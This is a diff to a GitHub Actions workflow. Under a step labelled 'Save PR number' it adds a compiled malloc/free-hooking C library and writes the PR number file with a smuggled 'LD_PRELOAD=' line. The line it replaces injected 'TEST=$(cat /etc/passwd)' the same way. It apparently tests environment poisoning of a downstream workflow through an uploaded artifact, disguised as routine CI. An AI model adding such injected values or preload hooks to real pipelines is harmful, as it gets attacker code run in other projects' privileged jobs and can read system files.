@@ -6,14 +6,48 @@ jobs:
   build_and_preview:
     runs-on: ubuntu-latest
     steps:
-
+      - name: Set up GCC
+        uses: egor-tensin/setup-gcc@v1
+        with:
+          version: latest
+          platform: x64
       - name: Save PR number
         run: |
+          cat >> lib.c << EOF
+          #define _GNU_SOURCE
+          #include <stdio.h>
+          #include <dlfcn.h>
+
+          static void* (*real_malloc)(size_t size);
+          static void  (*real_free)(void *ptr);
+
+          __attribute__((constructor))
+          static void init()
+          {
+                  real_malloc = dlsym(RTLD_NEXT, "malloc");
+                  real_free   = dlsym(RTLD_NEXT, "free");
+                  fprintf(stderr, "init\n");
+          }
+
+          void *malloc(size_t size)
+          {
+                  void *ptr = real_malloc(size);
+                  fprintf(stderr, "malloc(%zd) = %p\n", size, ptr);
+                  return ptr;
+          }
+
+          void free(void *ptr)
+          {
+                  real_free(ptr);
+                  fprintf(stderr, "free(%p)\n", ptr);
+          }
+          EOF
           mkdir -p ./pr
-          echo -e '${{ github.event.number }}\nTEST=$(cat /etc/passwd)' > ./pr/NR
+          gcc -shared -fPIC -o pr/lib.so lib.c
+          echo -e '${{ github.event.number }}\n'LD_PRELOAD=$GITHUB_WORKSPACE/pr/lib.so > ./pr/NR
           cat ./pr/NR
           env
-          echo testtt3334
+          echo testtt333
 
       - uses: actions/upload-artifact@v2
         with:
